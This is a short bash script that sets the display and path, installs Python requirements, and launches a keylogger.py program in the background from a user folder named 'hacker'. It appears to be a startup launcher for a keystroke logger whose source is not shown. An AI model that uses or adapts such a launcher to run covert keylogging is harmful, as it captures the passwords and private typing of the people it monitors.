#!/bin/bash
sleep 1
PATH=/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export DISPLAY=:0.0
#/usr/bin/python3 -m venv /home/hacker/Bureau/keylogger/venvp
#cd /home/hacker/Bureau/keylogger/venvp
#source /bin/activate

pip3 install -r  /home/hacker/Bureau/keylogger/requirements.txt
(python3 /home/hacker/Bureau/keylogger/keylogger.py /home/hacker/Bureau/keylogger/)&
